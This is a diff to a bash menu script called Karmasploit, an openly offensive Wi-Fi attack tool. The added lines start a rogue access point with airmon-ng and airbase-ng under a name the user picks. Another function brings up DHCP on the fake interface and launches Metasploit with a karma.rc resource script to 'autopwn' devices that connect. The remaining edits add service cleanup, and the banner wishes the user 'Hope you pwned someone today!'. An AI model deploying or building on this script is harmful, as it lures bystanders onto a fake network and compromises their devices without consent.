@@ -21,6 +21,7 @@ blue='\e[1;34m'
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
+service apache2 stop
 clear
 
 
@@ -58,7 +59,7 @@ read warning
 autopwning () {
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	touch /var/lib/dhcp/dhcpd.leases
-	dhcpd -cf /etc/dhcp/dhcpd.conf at0
+	dhcpd -cf dhcpd.conf at0
 	msfconsole -q -r $(pwd)/karma.rc
 }
 
@@ -76,7 +77,16 @@ echo -ne $yellow"root@B4ckp0r7:"; read answer1
 
 if test $answer1 == '1'
 	then
-	xterm -title "Rogue AP" -fa monaco -bg black -e "./rogueapstart.sh"
+	echo -e $yellow"Starting RogueAP"
+	echo -ne $green"Choose a name for your AP:" ;tput sgr0
+	read nameap
+	sleep 1
+	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	sleep 1
+	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
+	sleep 2
+	sudo airmon-ng start wlan1
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
 	menu
 elif test $answer1 == '2'
 	then
@@ -100,9 +110,11 @@ elif test $answer1 == '4'
 elif test $answer1 == '5'
 	then
 	clear
-	ifconfig at0 down
+	pkill dnsmasq
+	pkill dhcpd
 	pkill airmon-ng
 	pkill airbase-ng
+	ifconfig at0 down
 	echo -e $red"Goodbye.."
 	sleep 2
 	clear
@@ -114,8 +126,10 @@ else
 		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
 			then
 			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
+			pkill dhcpd
 			pkill airmon-ng
 			pkill airbase-ng
+			ifconfig at0 down
 			sleep 1
 			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
@@ -142,7 +156,16 @@ echo -ne $yellow"root@B4ckp0r7:"; read answer1
 
 if test $answer1 == '1'
 	then
-	xterm -title "Rogue AP" -fa monaco -bg black -e "./rogueapstart.sh"
+	echo -e $yellow"Starting RogueAP"
+	echo -ne $green"Choose a name for your AP:" ;tput sgr0
+	read nameap
+	sleep 1
+	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	sleep 1
+	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
+	sleep 2
+	sudo airmon-ng start wlan1
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
 	menu
 elif test $answer1 == '2'
 	then
@@ -166,9 +189,10 @@ elif test $answer1 == '4'
 elif test $answer1 == '5'
 	then
 	clear
-	ifconfig at0 down
+	pkill dhcpd
 	pkill airmon-ng
 	pkill airbase-ng
+	ifconfig at0 down
 	echo -e $red"Goodbye.."
 	sleep 2
 	clear
@@ -180,8 +204,10 @@ else
 		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
 			then
 			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
+			pkill dhcpd
 			pkill airmon-ng
 			pkill airbase-ng
+			ifconfig at0 down
 			sleep 1
 			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
